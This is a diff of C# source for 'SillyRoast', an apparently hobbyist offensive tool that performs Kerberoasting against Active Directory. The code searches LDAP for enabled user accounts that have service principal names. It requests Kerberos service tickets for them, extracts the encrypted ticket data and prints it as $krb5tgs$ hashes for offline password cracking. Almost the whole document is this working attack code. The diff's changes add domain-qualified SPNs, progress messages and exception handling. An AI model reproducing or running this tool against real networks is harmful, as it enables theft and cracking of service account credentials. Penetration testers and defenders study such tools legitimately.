@@ -1,17 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Diagnostics;
-using System.IO;
-using System.Linq;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
 using System.DirectoryServices;
-using System.DirectoryServices.AccountManagement;
-using System.Net.Sockets;
-using Asn1;
 using System.DirectoryServices.ActiveDirectory;
+using Asn1;
+
 
 namespace SillyRoast
 {
@@ -35,14 +27,18 @@ namespace SillyRoast
             ds = new DirectorySearcher(de);
             ds.Filter = query;
 
+            Console.WriteLine("[+] Finding Kerberoastable accounts...");
             results = ds.FindAll();
 
             var spns = new List<string>();
+            if(results.Count == 0)
+            {
+                Console.WriteLine("[-] No Kerberoastable accounts found :(");
+                System.Environment.Exit(0);
+            }
             foreach (SearchResult sr in results)
             {
-                // Using the index zero (0) is required!
                 spns.Add(sr.Properties["name"][0].ToString());
-
             }
 
             return spns.ToArray();
@@ -50,6 +46,8 @@ namespace SillyRoast
 
         static bool Kerberoast(string[] args)
         {
+
+            string domain = Domain.GetComputerDomain().ToString();
             string spnFilter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";
             string[] spns = Query(spnFilter);
 
@@ -58,12 +56,16 @@ namespace SillyRoast
             {
 
                 long encType = 0;
-                ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spns[i]);
+                string spn = spns[i] + "@" + domain;
+                
+                ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
+                Console.WriteLine("[+] Requesting ticket...");
                 byte[] requestBytes = ticket.GetRequest();
 
                 byte[] apReqBytes = new byte[requestBytes.Length - 17];
                 Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);
 
+                Console.WriteLine("[+] Decoding...");
                 AsnElt apRep = AsnElt.Decode(apReqBytes);
                 foreach (AsnElt elem in apRep.Sub[0].Sub)
                 {
@@ -88,18 +90,18 @@ namespace SillyRoast
 
                                         if ((encType == 18) || (encType == 17))
                                         {
-                                            //Ensure checksum is extracted from the end for aes keys
+                                           
                                             int checksumStart = cipherText.Length - 24;
-                                            //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
-                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, "", "", spns[i], cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+                                           
+                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                         }
-                                        //if encType==23
+                                       
                                         else
                                         {
-                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, "", "", spns[i], cipherText.Substring(0, 32), cipherText.Substring(32));
+                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                         }
 
-                                        Console.WriteLine(hash);
+                                        Console.WriteLine("[+] Got Hash!\n" + hash);
                                     }
                                 }
                             }
@@ -115,26 +117,22 @@ namespace SillyRoast
         static void Main(string[] args)
         {
             Console.WriteLine("\r\n\r\n███████╗██╗██╗     ██╗  ██╗   ██╗██████╗  ██████╗  █████╗ ███████╗████████╗\r\n██╔════╝██║██║     ██║  ╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝\r\n███████╗██║██║     ██║   ╚████╔╝ ██████╔╝██║   ██║███████║███████╗   ██║   \r\n╚════██║██║██║     ██║    ╚██╔╝  ██╔══██╗██║   ██║██╔══██║╚════██║   ██║   \r\n███████║██║███████╗███████╗██║   ██║  ██║╚██████╔╝██║  ██║███████║   ██║   \r\n╚══════╝╚═╝╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝ ");
-            Console.WriteLine("Kerberoast and ASREProast very silly - v0.1\n");
+            Console.WriteLine("Kerberoast in a very silly way\n");
 
-            if (args.Length > 0)
+            try
             {
-                switch (args[0])
+                bool didgood = Kerberoast(args);
+                if (didgood)
                 {
-                    case "kerberoast":
-                        Console.WriteLine("Kerberoasting...");
-                        bool didgo = Kerberoast(args);
-                        break;
-                    case "asreproast":
-                        Console.WriteLine("ASREProasting...");
-                        break;
+                    Console.WriteLine("[+] SillyRoast completed...");
                 }
-
+            
             }
-            else
+            catch (Exception ex)
             {
-                Console.WriteLine("Please supply arguments: Type \"--help\" to see a list of commands\n");
+                Console.WriteLine("[-] Exception: " + ex.Message);
             }
+            
 
 
 
